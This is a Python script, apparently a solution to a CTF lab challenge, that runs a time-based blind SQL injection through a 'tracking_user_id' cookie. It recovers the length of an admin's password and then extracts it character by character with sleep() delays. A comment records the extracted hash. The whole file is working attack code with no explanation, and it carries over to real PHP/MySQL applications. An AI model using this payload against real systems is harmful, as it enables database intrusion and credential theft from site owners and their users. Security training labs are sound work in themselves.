from multiprocessing import Pool
import requests
from queue import Queue

list_char = []

for i in range(ord('a'), ord('z') + 1):
    list_char.append(chr(i))
for i in range(ord('0'), ord('9') + 1):
    list_char.append(chr(i))

TIME_DELAY = 1


def get_length_password_status(length):
    url = 'https://labs.matesctf.org/lab/sqli/2/index.php?page=shop'
    cookies = {
        'PHPSESSID': '4df18412f4acb008524954c96f93bbf6',
        'tracking_user_id': "1-if((select length(password) from users where role = 'admin' limit 1) = {length}, sleep({time_delay}), 'a')".format(length=length, time_delay=TIME_DELAY)
    }
    response = requests.get(url=url, cookies=cookies)
    if response.elapsed.seconds > TIME_DELAY:
        print(response.elapsed.seconds, length)


def get_char_password(position):
    url = 'https://labs.matesctf.org/lab/sqli/2/index.php?page=shop'

    for char in list_char:
        cookies = {
            'PHPSESSID': '4df18412f4acb008524954c96f93bbf6',
            'tracking_user_id': "1-if((select substr(password, {position}, 1) from users where role = 'admin' limit 1) = '{char}', sleep({time_delay}), 'a')"
                .format(position=position, char=char, time_delay=TIME_DELAY)
        }

        response = requests.get(url=url, cookies=cookies)
        if response.elapsed.seconds > TIME_DELAY:
            return response.elapsed.seconds, position, char


def brute_force_length():
    number_process = 1
    with Pool(number_process) as p:
        p.map(get_length_password_status, range(1, 51))
        # length = 40


def brute_force_password():
    password = []
    for i in range(1, 41):
        time, position, char = get_char_password(i)
        password.append(char)
        print(time, char, position)
    print(str(password))

    #1c16d7f716baa9ff41e16dbc6b4e144acc5dcaeb


if __name__ == '__main__':
    brute_force_length()
    # brute_force_password()

